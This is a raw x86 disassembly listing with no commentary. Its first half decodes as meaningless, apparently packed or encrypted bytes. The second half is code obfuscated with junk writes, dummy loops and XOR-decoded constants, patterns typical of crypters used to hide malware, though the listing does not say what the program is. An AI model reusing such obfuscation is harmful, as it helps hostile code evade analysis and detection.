  41bbe0:	pusha  
  41bbe1:	imul   ebx,eax,0x3363a3f4
  41bbe7:	repz and DWORD PTR ss:[ebx-0x6b],0xf1b30c67
  41bbf0:	popf   
  41bbf1:	dec    edx
  41bbf2:	faddp  st(5),st
  41bbf4:	inc    edi
  41bbf5:	cmp    edi,DWORD PTR [eax+0x2d]
  41bbf8:	push   ds
  41bbf9:	add    ebx,DWORD PTR [esi+0x35]
  41bbfc:	imul   edi,DWORD PTR gs:[edi-0x6cf21777],0x858d1607
  41bc07:	popf   
  41bc08:	sbb    eax,0xcb0f1770
  41bc0d:	or     al,BYTE PTR [eax+edi*2+0x57a779d8]
  41bc14:	imul   edx,DWORD PTR [eax],0x24d6e4e6
  41bc1a:	xchg   edx,eax
  41bc1b:	inc    esi
  41bc1c:	(bad)  
  41bc1d:	(bad)  
  41bc1f:	mov    edx,0xde878794
  41bc24:	shr    esi,cl
  41bc26:	pop    ds
  41bc27:	repnz rcr DWORD PTR [ebx+0x7c169218],cl
  41bc2e:	mov    ah,0x47
  41bc30:	aad    0xd8
  41bc32:	jmp    0x41bc91
  41bc34:	pop    ebp
  41bc35:	xchg   ecx,eax
  41bc36:	scas   al,BYTE PTR es:[edi]
  41bc37:	dec    eax
  41bc38:	xor    al,0x71
  41bc3a:	dec    ecx
  41bc3b:	repz scas eax,DWORD PTR es:[edi]
  41bc3d:	mov    eax,ds:0x30ef4536
  41bc42:	inc    ebp
  41bc43:	sar    DWORD PTR [edi+0x2e],cl
  41bc46:	pop    edi
  41bc47:	ds cdq 
  41bc49:	cmp    ebx,0x72
  41bc4c:	ins    BYTE PTR es:[edi],dx
  41bc4d:	jge    0x41bc34
  41bc4f:	hlt    
  41bc50:	(bad)  
  41bc51:	aaa    
  41bc52:	aas    
  41bc53:	gs or  eax,0x80c6fd80
  41bc59:	sbb    DWORD PTR [eax-0x18],ecx
  41bc5c:	pop    ecx
  41bc5d:	jl     0x41bbe4
  41bc5f:	sub    BYTE PTR [ecx],bl
  41bc61:	mov    cl,0x96
  41bc63:	inc    eax
  41bc64:	mov    ch,0xe8
  41bc66:	pop    edi
  41bc67:	lock sub cl,cl
  41bc6a:	imul   esp,ebp,0x8
  41bc6d:	adc    BYTE PTR [esi],ah
  41bc6f:	clc    
  41bc70:	pop    esi
  41bc71:	fscale 
  41bc73:	outs   dx,DWORD PTR ds:[esi]
  41bc74:	lods   al,BYTE PTR ds:[esi]
  41bc75:	xchg   ebx,eax
  41bc76:	les    ebp,FWORD PTR [edx+0x5c]
  41bc79:	cmp    eax,0xf264137f
  41bc7e:	fstp   QWORD PTR [eax+0x7f33f2e8]
  41bc84:	xchg   esp,eax
  41bc85:	mov    ecx,0xc31893a5
  41bc8a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc8c:	xor    al,bl
  41bc8e:	(bad)  
  41bc8f:	mov    edx,0xf56bfb89
  41bc94:	and    cl,BYTE PTR [ecx-0x46]
  41bc97:	push   esi
  41bc98:	sbb    BYTE PTR [edx-0x42],ch
  41bc9b:	jbe    0x41bd10
  41bc9d:	add    DWORD PTR [eax],eax
  41bc9f:	addr16 inc cx
  41bca2:	shr    al,0x56
  41bca5:	(bad)  
  41bca6:	cmp    bl,BYTE PTR [edi]
  41bca8:	sbb    al,0x10
  41bcaa:	mov    al,0x7e
  41bcac:	push   ss
  41bcad:	push   ds
  41bcae:	and    al,0xd8
  41bcb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcb1:	aad    0x3e
  41bcb3:	fwait
  41bcb4:	and    DWORD PTR [ecx-0x5b7335b],ebx
  41bcba:	jle    0x41bc73
  41bcbc:	mul    BYTE PTR [edx-0x35]
  41bcbf:	dec    edx
  41bcc0:	sub    bh,BYTE PTR [eax+0x36e64537]
  41bcc6:	pop    es
  41bcc7:	ror    BYTE PTR [eax+0x67268a37],cl
  41bccd:	jp     0x41bd28
  41bccf:	dec    esi
  41bcd0:	mov    ebp,0x32565982
  41bcd5:	shl    DWORD PTR [ecx+0x26310de0],cl
  41bcdb:	call   0xc2499c1b
  41bce0:	push   esi
  41bce1:	sbb    al,0x9b
  41bce3:	mov    es,edi
  41bce5:	mov    esi,0xd0293cb7
  41bceb:	add    bh,cl
  41bced:	test   eax,0x4f5b7d03
  41bcf2:	and    al,0x61
  41bcf4:	cmp    ah,BYTE PTR [ebp-0x30b67767]
  41bcfa:	ins    BYTE PTR es:[edi],dx
  41bcfb:	loopne 0x41bcf7
  41bcfd:	push   ecx
  41bcfe:	or     eax,0xa7a7fe38
  41bd03:	xchg   ebp,eax
  41bd04:	jne    0x41bd4f
  41bd06:	es aas 
  41bd08:	mov    al,ds:0x1f6df330
  41bd0d:	gs pop es
  41bd0f:	mov    eax,0xeeaf9db0
  41bd14:	add    dh,BYTE PTR [edx-0x43e5a167]
  41bd1a:	cs inc ebp
  41bd1c:	stos   DWORD PTR es:[edi],eax
  41bd1d:	mov    BYTE PTR [edi+0x6e],bl
  41bd20:	aaa    
  41bd21:	pop    ss
  41bd22:	jge    0x41bd01
  41bd24:	loopne 0x41bcd0
  41bd26:	call   0x85e50457
  41bd2b:	cmp    DWORD PTR [edi-0x4fc303e7],edi
  41bd31:	xchg   ebp,eax
  41bd32:	mov    edx,0x7ca612df
  41bd37:	mov    dh,0xe6
  41bd39:	add    BYTE PTR [ebx-0x26461072],0x93
  41bd40:	push   0xffffffa9
  41bd42:	mov    esi,0xde65f77f
  41bd47:	out    0x64,al
  41bd49:	mov    edx,0xb129fa6d
  41bd4e:	push   cs
  41bd4f:	test   bl,0xd2
  41bd52:	adc    DWORD PTR [esi+0x27],edx
  41bd55:	je     0x41bd37
  41bd57:	jns    0x41bcf2
  41bd59:	lahf   
  41bd5a:	adc    esi,DWORD PTR [edx+0x728aa066]
  41bd60:	int3   
  41bd61:	les    esp,FWORD PTR [ebp+0x4]
  41bd64:	loope  0x41bd0c
  41bd66:	pop    edi
  41bd67:	push   cs
  41bd68:	mov    DWORD PTR [eax+0x44b75416],esi
  41bd6e:	xchg   DWORD PTR [esi],eax
  41bd70:	xchg   esp,eax
  41bd71:	mov    WORD PTR [eax+0x3d00b61a],gs
  41bd77:	push   ecx
  41bd78:	mov    ds:0xd127d854,al
  41bd7d:	sbb    al,0xaa
  41bd7f:	xor    al,0x16
  41bd81:	stos   DWORD PTR es:[edi],eax
  41bd82:	leave  
  41bd83:	clc    
  41bd84:	dec    edx
  41bd85:	ds call 0xce11:0x62fa0fbd
  41bd8d:	inc    edi
  41bd8e:	sbb    DWORD PTR [esi-0x50b11b87],eax
  41bd94:	cmp    al,0xa3
  41bd96:	ds mov dh,0x89
  41bd99:	inc    ebx
  41bd9a:	sbb    ebx,esi
  41bd9c:	inc    edx
  41bd9d:	sbb    al,0xaf
  41bd9f:	into   
  41bda0:	jp     0x41bd98
  41bda2:	shl    ebp,1
  41bda4:	cmp    BYTE PTR [edi],bl
  41bda6:	sti    
  41bda7:	jg     0x41bd5c
  41bda9:	jg     0x41bd53
  41bdab:	es cmp ebp,edi
  41bdae:	xor    eax,0xafdf4eae
  41bdb3:	adc    DWORD PTR [ecx-0x5a],0x657d9ea8
  41bdba:	dec    esp
  41bdbb:	test   DWORD PTR [ecx+0x57d23007],edx
  41bdc1:	sub    bl,dh
  41bdc3:	(bad)  
  41bdc4:	pop    ebp
  41bdc5:	mov    ds:0xdde91747,eax
  41bdca:	inc    edi
  41bdcb:	ja     0x41bdd3
  41bdcd:	je     0x41be01
  41bdcf:	xchg   edx,eax
  41bdd0:	push   es
  41bdd1:	pushw  0xac38
  41bdd5:	cli    
  41bdd6:	or     DWORD PTR [ebx-0x164936f3],esp
  41bddc:	cmovle edi,ecx
  41bddf:	pop    eax
  41bde0:	and    DWORD PTR [ebp-0x1f61cb13],eax
  41bde6:	jno    0x41be56
  41bde8:	xor    al,0xd1
  41bdea:	sub    BYTE PTR [ebp+0x71],bl
  41bded:	imul   esp,DWORD PTR [ecx-0x1e],0x79
  41bdf1:	jecxz  0x41be6a
  41bdf3:	add    edi,ebx
  41bdf5:	pop    ebp
  41bdf6:	jne    0x41bde4
  41bdf8:	mov    WORD PTR [esi+0x1c],es
  41bdfb:	popa   
  41bdfc:	inc    esp
  41bdfd:	stos   DWORD PTR es:[edi],eax
  41bdfe:	out    dx,al
  41bdff:	pop    ecx
  41be00:	pop    ss
  41be01:	adc    al,0x6e
  41be03:	out    0x84,eax
  41be05:	aaa    
  41be06:	sbb    eax,0xe18e1817
  41be0b:	mov    WORD PTR [esi],gs
  41be0d:	les    ecx,FWORD PTR [ebx-0x12bbb4ee]
  41be13:	addr16 pop ebx
  41be15:	and    eax,0x917e25e0
  41be1a:	or     esi,ebx
  41be1c:	xchg   ebx,eax
  41be1d:	ins    BYTE PTR es:[edi],dx
  41be1e:	pop    ss
  41be1f:	outs   dx,BYTE PTR ds:[esi]
  41be20:	jnp    0x41bdc7
  41be22:	rcl    BYTE PTR [ebx+0x69],cl
  41be25:	mov    al,ds:0x46a53946
  41be2a:	jp     0x41be96
  41be2c:	in     al,dx
  41be2d:	mov    al,ds:0x4b76223a
  41be32:	dec    esi
  41be33:	ds addr16 mov cl,0x5f
  41be37:	dec    ebx
  41be38:	les    ebx,FWORD PTR [edi-0x2e]
  41be3b:	inc    esi
  41be3c:	or     BYTE PTR [ecx-0x58],bh
  41be3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be40:	inc    edx
  41be41:	out    0xc1,al
  41be43:	fisttp QWORD PTR [eax]
  41be45:	inc    esi
  41be46:	push   edi
  41be47:	shl    BYTE PTR [ebx-0x4f],0x11
  41be4b:	inc    ebp
  41be4c:	xor    eax,0xd13ef5fb
  41be51:	nop
  41be52:	and    BYTE PTR [ebx+0x1705efec],bh
  41be58:	retf   
  41be59:	jne    0x41bdeb
  41be5b:	sbb    cl,BYTE PTR [esi+0x67bd51ba]
  41be61:	in     al,0x59
  41be63:	push   eax
  41be64:	inc    esi
  41be65:	mov    al,ds:0xf26a589a
  41be6a:	ret    0xd421
  41be6d:	int    0xe1
  41be6f:	mov    ebp,0x6ce2635
  41be74:	sub    al,0xa7
  41be76:	test   DWORD PTR [ebp+0x2926ac68],ecx
  41be7c:	das    
  41be7d:	cmp    ebp,DWORD PTR [ecx-0x5ca1960b]
  41be83:	retf   0x882f
  41be86:	inc    ebp
  41be87:	or     edx,DWORD PTR [edi]
  41be89:	adc    al,0xa9
  41be8b:	sbb    edx,esi
  41be8d:	or     eax,0xa55d794
  41be92:	lahf   
  41be93:	xlat   BYTE PTR ds:[ebx]
  41be94:	rcl    DWORD PTR [edi+0x6b],1
  41be97:	xchg   esp,eax
  41be98:	push   ds
  41be99:	imul   eax,ebx,0xfffffff5
  41be9c:	rol    DWORD PTR [ebx+0x26],1
  41be9f:	mov    edi,0xb5b6575e
  41bea4:	(bad)  
  41bea5:	out    dx,al
  41bea6:	(bad)  
  41bea7:	mov    eax,ds:0xd46b16af
  41beac:	loope  0x41be4e
  41beae:	daa    
  41beaf:	cmp    eax,0x19646f96
  41beb4:	dec    esp
  41beb5:	dec    ebx
  41beb6:	jp     0x41be5e
  41beb8:	sbb    ah,BYTE PTR [ebx]
  41beba:	ret    0xd3be
  41bebd:	mov    BYTE PTR [edx+0x63],bl
  41bec0:	pusha  
  41bec1:	add    DWORD PTR [esi],0xa6b1160a
  41bec7:	test   BYTE PTR [eax-0x10ebef44],ch
  41becd:	jge    0x41bf4c
  41becf:	retf   
  41bed0:	data16 std 
  41bed2:	push   ebp
  41bed3:	sub    esp,DWORD PTR [ecx-0x18c26cbf]
  41bed9:	test   bh,0xbf
  41bedc:	jp     0x41bed4
  41bede:	arpl   WORD PTR [ebp-0x47],sp
  41bee1:	or     eax,0xc3ccbf13
  41bee6:	out    0xec,al
  41bee8:	(bad)  
  41bee9:	loopne 0x41bec0
  41beeb:	sbb    edi,0xa65191b5
  41bef1:	mov    bl,BYTE PTR [ebx]
  41bef3:	pusha  
  41bef4:	cmp    BYTE PTR [ebx+0x4f],bh
  41bef7:	out    0x94,al
  41bef9:	aad    0x88
  41befb:	xchg   cl,cl
  41befd:	bound  esi,QWORD PTR [edi-0x29]
  41bf00:	test   ecx,ebp
  41bf02:	sbb    al,0x16
  41bf04:	xor    DWORD PTR [ecx-0x69],ebx
  41bf07:	(bad)  
  41bf08:	out    0xe3,al
  41bf0a:	sahf   
  41bf0b:	fwait
  41bf0c:	inc    ecx
  41bf0d:	sti    
  41bf0e:	pop    edi
  41bf0f:	std    
  41bf10:	mov    dh,0xb3
  41bf12:	xchg   esi,eax
  41bf13:	int3   
  41bf14:	aas    
  41bf15:	dec    ebp
  41bf16:	pop    edi
  41bf17:	sbb    BYTE PTR [ecx],dl
  41bf19:	pop    edi
  41bf1a:	adc    DWORD PTR [esi+0x27790cc1],0xffffffc5
  41bf21:	stos   BYTE PTR es:[edi],al
  41bf22:	rcr    BYTE PTR [ebx-0x4d],cl
  41bf25:	adc    esp,eax
  41bf27:	cdq    
  41bf28:	mov    ecx,0xa536dfef
  41bf2d:	mov    ah,0x50
  41bf2f:	sbb    ecx,ebp
  41bf31:	mov    ch,0xd9
  41bf33:	sub    al,0x8b
  41bf35:	jae    0x41bf32
  41bf37:	push   edi
  41bf38:	jo     0x41bf42
  41bf3a:	mov    ebx,0x42500d59
  41bf3f:	fwait
  41bf40:	das    
  41bf41:	inc    eax
  41bf42:	fild   DWORD PTR [ebp-0x1509de76]
  41bf48:	pop    ebx
  41bf49:	sub    eax,0x86e471e3
  41bf4e:	lds    eax,FWORD PTR [ebp+eiz*1-0x3eb69a2f]
  41bf55:	push   es
  41bf56:	mov    ah,BYTE PTR [edi+0x5d5ddcd8]
  41bf5c:	ror    DWORD PTR [edx+ebx*2-0x3a],1
  41bf60:	xor    eax,0x8a622d9a
  41bf65:	or     al,0xc8
  41bf67:	sbb    esi,DWORD PTR [ecx]
  41bf69:	rcr    BYTE PTR gs:[edi],1
  41bf6c:	iret   
  41bf6d:	fwait
  41bf6e:	sub    BYTE PTR ds:[eax],dh
  41bf71:	rcl    sp,0x24
  41bf75:	or     al,0xf4
  41bf77:	fcom   DWORD PTR [edi+0x7f00a989]
  41bf7d:	add    DWORD PTR [edx-0x32],0x28
  41bf81:	frstor [ecx-0x6a]
  41bf84:	repnz xchg ebx,eax
  41bf86:	or     edi,DWORD PTR [ecx-0x78]
  41bf89:	inc    esi
  41bf8a:	int3   
  41bf8b:	sti    
  41bf8c:	dec    eax
  41bf8d:	xor    ebp,DWORD PTR [eax+0x4cf06529]
  41bf93:	and    BYTE PTR [ecx+0x6d],bl
  41bf96:	shl    cl,0xfe
  41bf99:	aaa    
  41bf9a:	retf   
  41bf9b:	ins    BYTE PTR es:[edi],dx
  41bf9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf9d:	sbb    edi,ebp
  41bf9f:	int3   
  41bfa0:	and    dh,ah
  41bfa2:	mov    eax,0xc860855b
  41bfa7:	fsubr  QWORD PTR [edi+ebx*1]
  41bfaa:	stc    
  41bfab:	dec    ecx
  41bfac:	dec    edx
  41bfad:	jne    0x41bf8f
  41bfaf:	xor    ah,ch
  41bfb1:	mov    ecx,0xa42935fa
  41bfb6:	sbb    bh,dl
  41bfb8:	add    DWORD PTR [esi+0x3aee9686],edi
  41bfbe:	xor    al,0xaa
  41bfc0:	mov    ebx,DWORD PTR [esi-0xd]
  41bfc3:	jb     0x41bf83
  41bfc5:	push   ds
  41bfc6:	lds    eax,FWORD PTR [edi-0x496ef342]
  41bfcc:	inc    ebx
  41bfcd:	inc    esp
  41bfce:	and    dh,BYTE PTR [ecx+0xc]
  41bfd1:	stos   BYTE PTR es:[edi],al
  41bfd2:	std    
  41bfd3:	mov    edx,0xb1a515dd
  41bfd8:	inc    DWORD PTR [edx+0x5f283ba6]
  41bfde:	stos   BYTE PTR es:[edi],al
  41bfdf:	rcl    BYTE PTR [esi-0xc0090ab],0xfa
  41bfe6:	jne    0x41c005
  41bfe8:	push   es
  41bfe9:	add    al,0x2d
  41bfeb:	js     0x41bfdc
  41bfed:	fidiv  DWORD PTR [ebx]
  41bfef:	into   
  41bff0:	jb     0x41bfc6
  41bff2:	sti    
  41bff3:	or     DWORD PTR [edx],edi
  41bff5:	and    al,0xa9
  41bff7:	dec    ebp
  41bff8:	imul   esp,edx,0x1f62dd2f
  41bffe:	test   DWORD PTR [edx+0x5b056c1c],esp
  41c004:	test   eax,0x6b75a49d
  41c009:	inc    ecx
  41c00a:	leave  
  41c00b:	dec    ebx
  41c00c:	add    al,0x3e
  41c00e:	cld    
  41c00f:	sub    edx,ebx
  41c011:	add    BYTE PTR [ebp-0x192cfe12],bh
  41c017:	ds hlt 
  41c019:	neg    BYTE PTR [ecx+0x74]
  41c01c:	ret    0x94f2
  41c01f:	jo     0x41c064
  41c021:	repz sub cl,BYTE PTR [ebx+0x14]
  41c025:	cmp    dl,BYTE PTR ds:0xff59df8c
  41c02b:	ja     0x41c0ac
  41c02d:	xchg   BYTE PTR [esp+edi*4+0x5a6679ef],bl
  41c034:	xchg   ebx,eax
  41c035:	pop    ecx
  41c036:	adc    ch,bh
  41c038:	dec    ebp
  41c039:	bound  edx,QWORD PTR [ebx]
  41c03b:	sbb    edi,0xffffffbc
  41c03e:	jo     0x41c02c
  41c040:	jae    0x41c011
  41c042:	jg     0x41c0b1
  41c044:	fld    st(7)
  41c046:	in     eax,dx
  41c047:	psrad  mm1,QWORD PTR [ebx-0x4b0840be]
  41c04e:	fiadd  WORD PTR [edi-0x3f3c9e3b]
  41c054:	inc    eax
  41c055:	adc    DWORD PTR [ebx-0x498902b4],eax
  41c05b:	push   ds
  41c05c:	popf   
  41c05d:	inc    edi
  41c05e:	inc    ebp
  41c05f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c060:	(bad)  
  41c061:	fistp  DWORD PTR [edi]
  41c063:	and    edi,DWORD PTR [edx+0x48c7ffc]
  41c069:	mov    ah,0xf0
  41c06b:	or     BYTE PTR [ebp-0x45],bh
  41c06e:	scas   eax,DWORD PTR es:[edi]
  41c06f:	stc    
  41c070:	cmp    al,0xa
  41c072:	ror    DWORD PTR [ebp+0x25],1
  41c075:	pop    ecx
  41c076:	sbb    eax,0x9588a69d
  41c07b:	in     eax,0x77
  41c07d:	ds leave 
  41c07f:	and    eax,0x958eceed
  41c084:	ss ret 
  41c086:	int    0xdd
  41c088:	sahf   
  41c089:	imul   esi,DWORD PTR [edx-0x75ab73f0],0xffffff88
  41c090:	faddp  st(7),st
  41c092:	adc    edx,DWORD PTR ds:0x4abd03cc
  41c098:	jge    0x41c099
  41c09a:	jns    0x41c0dd
  41c09c:	mov    al,0x9f
  41c09e:	in     eax,dx
  41c09f:	sbb    DWORD PTR [ebx],edx
  41c0a1:	lock sahf 
  41c0a3:	clc    
  41c0a4:	inc    ebx
  41c0a5:	xchg   ecx,eax
  41c0a6:	mov    al,ds:0xd928bb4e
  41c0ab:	mov    al,0xfa
  41c0ad:	adc    DWORD PTR [ebp-0x3fb1132f],edx
  41c0b3:	ret    0xec76
  41c0b6:	or     eax,DWORD PTR [ebp-0xf]
  41c0b9:	lock push 0x73300be6
  41c0bf:	xchg   esp,eax
  41c0c0:	inc    eax
  41c0c1:	or     eax,0xba5a8668
  41c0c6:	frstor [esi-0x42]
  41c0c9:	clc    
  41c0ca:	push   ecx
  41c0cb:	xor    al,0x32
  41c0cd:	je     0x41c0b8
  41c0cf:	mov    ds:0x467d4752,eax
  41c0d4:	inc    edx
  41c0d5:	adc    dh,BYTE PTR [ecx+edi*2]
  41c0d8:	leave  
  41c0d9:	fdiv   DWORD PTR [edx+0x5e377978]
  41c0df:	(bad)  
  41c0e0:	icebp  
  41c0e1:	(bad)  
  41c0e2:	mov    cl,0x9f
  41c0e4:	ret    0x9752
  41c0e7:	inc    ebp
  41c0e8:	jne    0x41c136
  41c0ea:	aad    0x11
  41c0ec:	pop    esi
  41c0ed:	idiv   BYTE PTR [eax]
  41c0ef:	cmp    al,BYTE PTR [ecx]
  41c0f1:	add    DWORD PTR [si],ecx
  41c0f4:	xchg   ecx,eax
  41c0f5:	xor    BYTE PTR [ebx],dl
  41c0f7:	bnd jge 0x41c153
  41c0fa:	int3   
  41c0fb:	repnz lods eax,DWORD PTR ds:[esi]
  41c0fd:	mov    ecx,DWORD PTR ss:[ebp-0x18]
  41c101:	add    edi,edx
  41c103:	cmp    ecx,edi
  41c105:	je     0x41c147
  41c10b:	mov    ecx,DWORD PTR [ebp-0x18]
  41c10e:	add    ecx,eax
  41c110:	mov    DWORD PTR [ebp-0x1c],ecx
  41c113:	mov    ecx,DWORD PTR [ebp-0x30]
  41c116:	mov    edx,DWORD PTR [ebp-0x2c]
  41c119:	mov    edx,0xa147
  41c11e:	xor    cx,dx
  41c121:	mov    edx,DWORD PTR [ebp-0x1c]
  41c124:	mov    edx,DWORD PTR [edx+0xc]
  41c127:	add    cx,si
  41c12a:	cmp    WORD PTR [eax+edx*1],cx
  41c12e:	jne    0x41c147
  41c134:	mov    ecx,DWORD PTR ds:0x4262c9
  41c13a:	mov    ecx,DWORD PTR [ecx+0x198]
  41c140:	mov    DWORD PTR [ecx],eax
  41c142:	jmp    0x41c1c5
  41c147:	push   DWORD PTR [ebp+0x1c]
  41c14a:	push   DWORD PTR [ebp+0x18]
  41c14d:	jmp    0x41c1b4
  41c152:	mov    eax,DWORD PTR [ebp+0x18]
  41c155:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c158:	cmp    eax,0x70941f9e
  41c15d:	jne    0x41c176
  41c163:	cmp    ecx,ebx
  41c165:	jne    0x41c176
  41c16b:	push   ebx
  41c16c:	push   0x70941f9b
  41c171:	jmp    0x41c1b4
  41c176:	mov    ecx,DWORD PTR [ebp+0x18]
  41c179:	mov    edx,DWORD PTR [ebp+0x1c]
  41c17c:	mov    eax,0x70941f98
  41c181:	cmp    ecx,eax
  41c183:	jne    0x41c198
  41c189:	cmp    edx,ebx
  41c18b:	jne    0x41c198
  41c191:	push   ebx
  41c192:	push   edi
  41c193:	jmp    0x41c1b4
  41c198:	mov    ecx,DWORD PTR [ebp+0x18]
  41c19b:	mov    edx,DWORD PTR [ebp+0x1c]
  41c19e:	cmp    ecx,0x70941f9b
  41c1a4:	jne    0x41c1c5
  41c1aa:	cmp    edx,ebx
  41c1ac:	jne    0x41c1c5
  41c1b2:	push   ebx
  41c1b3:	push   eax
  41c1b4:	push   DWORD PTR [ebp+0x14]
  41c1b7:	push   DWORD PTR [ebp+0x10]
  41c1ba:	push   DWORD PTR [ebp+0xc]
  41c1bd:	push   DWORD PTR [ebp+0x8]
  41c1c0:	call   0x417355
  41c1c5:	pop    edi
  41c1c6:	pop    esi
  41c1c7:	pop    ebx
  41c1c8:	leave  
  41c1c9:	ret    0x18
  41c1cc:	push   ebp
  41c1cd:	mov    ebp,esp
  41c1cf:	and    esp,0xfffffff8
  41c1d2:	add    DWORD PTR ds:0x426f09,0x426ef5
  41c1dc:	mov    al,ds:0x4263ef
  41c1e1:	sub    esp,0x54
  41c1e4:	mov    DWORD PTR ds:0x426eb5,0x2e24
  41c1ee:	push   ebx
  41c1ef:	push   esi
  41c1f0:	push   edi
  41c1f1:	mov    DWORD PTR ds:0x426f15,0x7495
  41c1fb:	cmp    al,BYTE PTR ds:0x4263fa
  41c201:	mov    DWORD PTR ds:0x426ee9,0x194c
  41c20b:	je     0x41c22c
  41c211:	or     DWORD PTR ds:0x426eed,0x426ed5
  41c21b:	xor    eax,eax
  41c21d:	mov    DWORD PTR ds:0x426ee1,0xaaa
  41c227:	jmp    0x41d276
  41c22c:	mov    al,ds:0x42640c
  41c231:	cmp    al,BYTE PTR ds:0x42641b
  41c237:	mov    DWORD PTR ds:0x426ee9,0x1f8d
  41c241:	jne    0x41c211
  41c247:	neg    edi
  41c249:	mov    edi,DWORD PTR ds:0x430a50
  41c24f:	and    DWORD PTR ds:0x426ee1,0x426e95
  41c259:	push   0x426425
  41c25e:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c268:	push   0x426435
  41c26d:	adc    DWORD PTR ds:0x426eed,0x426ed5
  41c277:	call   edi
  41c279:	test   eax,eax
  41c27b:	mov    DWORD PTR ds:0x426ee5,0x502f
  41c285:	je     0x41c211
  41c28b:	push   0x426449
  41c290:	and    DWORD PTR ds:0x426f1d,0x426ef1
  41c29a:	call   DWORD PTR ds:0x430a34
  41c2a0:	mov    DWORD PTR [esp+0x44],0x0
  41c2a8:	mov    ecx,0xf89c85b5
  41c2ad:	mov    DWORD PTR [esp+0x10],ecx
  41c2b1:	mov    DWORD PTR ds:0x426edd,0x1a
  41c2bb:	cmp    DWORD PTR ds:0x426edd,0x0
  41c2c2:	je     0x41c31b
  41c2c8:	cmp    DWORD PTR ds:0x426edd,0x7
  41c2cf:	jle    0x41c31b
  41c2d5:	jmp    0x41c2ed
  41c2da:	push   DWORD PTR [ebp-0x20]
  41c2dd:	push   0x4e76
  41c2e2:	push   0x4592
  41c2e7:	call   DWORD PTR ds:0x430a18
  41c2ed:	cmp    DWORD PTR ds:0x426edd,0x8
  41c2f4:	jne    0x41c309
  41c2fa:	xor    edx,edx
  41c2fc:	add    edx,DWORD PTR ds:0x426edd
  41c302:	dec    edx
  41c303:	mov    DWORD PTR ds:0x426edd,edx
  41c309:	mov    edx,DWORD PTR ds:0x426edd
  41c30f:	dec    edx
  41c310:	mov    DWORD PTR ds:0x426edd,edx
  41c316:	jmp    0x41c2bb
  41c31b:	mov    DWORD PTR [esp+0x1c],0xf89c85b4
  41c323:	lea    eax,[esp+0x34]
  41c327:	mov    DWORD PTR [esp+0x44],eax
  41c32b:	mov    esi,DWORD PTR ds:0x428cf5
  41c331:	mov    ebx,DWORD PTR ds:0x42af49
  41c337:	sub    esi,ebx
  41c339:	sub    esi,DWORD PTR [esi+ebx*1]
  41c33c:	lea    eax,[esp+0x30]
  41c340:	mov    DWORD PTR [esp+0x28],eax
  41c344:	sub    DWORD PTR ds:0x426ea9,0x492f
  41c34e:	mov    eax,ds:0x4262c9
  41c353:	mov    edx,DWORD PTR ds:0x426ef9
  41c359:	sbb    DWORD PTR ds:0x426f05,edx
  41c35f:	mov    eax,DWORD PTR [eax+0x1c8]
  41c365:	mov    DWORD PTR ds:0x426f29,0x788d
  41c36f:	mov    eax,DWORD PTR [eax]
  41c371:	mov    edx,DWORD PTR [esp+0x28]
  41c375:	and    DWORD PTR ds:0x426efd,0x0
  41c37f:	jmp    0x41c393
  41c384:	xor    esi,esi
  41c386:	xor    esi,DWORD PTR ds:0x426efd
  41c38c:	inc    esi
  41c38d:	mov    DWORD PTR ds:0x426efd,esi
  41c393:	cmp    DWORD PTR ds:0x426efd,0x1a
  41c39a:	jae    0x41c3cb
  41c3a0:	cmp    DWORD PTR ds:0x426efd,0x1c
  41c3a7:	jge    0x41c3cb
  41c3ad:	jmp    0x41c3c6
  41c3b2:	push   DWORD PTR [ebp-0xc]
  41c3b5:	push   0x4c83
  41c3ba:	push   DWORD PTR [ebp-0x14]
  41c3bd:	push   DWORD PTR [ebp-0x1c]
  41c3c0:	call   DWORD PTR ds:0x430a4c
  41c3c6:	jmp    0x41c384
  41c3cb:	mov    esi,0x75108b3
  41c3d0:	and    DWORD PTR ds:0x426e81,0x1564
  41c3da:	xor    eax,esi
  41c3dc:	mov    ebx,0x3272fa
  41c3e1:	add    eax,ebx
  41c3e3:	mov    DWORD PTR [edx],eax
  41c3e5:	mov    DWORD PTR ds:0x426ea1,0x7a67
  41c3ef:	mov    eax,ds:0x426d99
  41c3f4:	mov    DWORD PTR ds:0x426f1d,0x65da
  41c3fe:	cmp    eax,0x455dedfa
  41c403:	mov    DWORD PTR ds:0x426ea9,0x55fc
  41c40d:	jne    0x41c4f5
  41c413:	and    DWORD PTR ds:0x426ef5,0x0
  41c41d:	mov    eax,ds:0x426ef5
  41c422:	inc    eax
  41c423:	mov    ds:0x426ef5,eax
  41c428:	cmp    DWORD PTR ds:0x426ef5,0xd
  41c42f:	jl     0x41c479
  41c435:	jmp    0x41c454
  41c43a:	push   0x59de
  41c43f:	push   0x39ed
  41c444:	push   0x1b7c
  41c449:	push   0x44aa
  41c44e:	call   DWORD PTR ds:0x430a1c
  41c454:	cmp    DWORD PTR ds:0x426ef5,0xc
  41c45b:	jne    0x41c46c
  41c461:	mov    eax,ds:0x426ef5
  41c466:	inc    eax
  41c467:	mov    ds:0x426ef5,eax
  41c46c:	cmp    DWORD PTR ds:0x426ef5,0x1f
  41c473:	jb     0x41c41d
  41c479:	mov    eax,DWORD PTR [esp+0x10]
  41c47d:	xor    edx,DWORD PTR ds:0x426ecd
  41c483:	mov    edx,DWORD PTR ds:0x4262c9
  41c489:	mov    edx,DWORD PTR [edx+0x198]
  41c48f:	add    DWORD PTR ds:0x426ec5,0x6b2
  41c499:	xor    eax,esi
  41c49b:	adc    DWORD PTR ds:0x426f25,0x426ef9
  41c4a5:	add    eax,ebx
  41c4a7:	and    DWORD PTR ds:0x426e85,0x426f15
  41c4b1:	mov    DWORD PTR [edx],eax
  41c4b3:	mov    eax,DWORD PTR [esp+0x10]
  41c4b7:	sub    DWORD PTR ds:0x426ec9,0x4e94
  41c4c1:	xor    eax,esi
  41c4c3:	add    eax,ebx
  41c4c5:	adc    DWORD PTR ds:0x426e81,0x426e91
  41c4cf:	mov    ds:0x426d99,eax
  41c4d4:	mov    eax,DWORD PTR [esp+0x10]
  41c4d8:	adc    DWORD PTR ds:0x426eed,0x426ef9
  41c4e2:	xor    eax,esi
  41c4e4:	add    eax,ebx
  41c4e6:	sub    DWORD PTR ds:0x426ea9,0x426e85
  41c4f0:	mov    ds:0x4263c1,eax
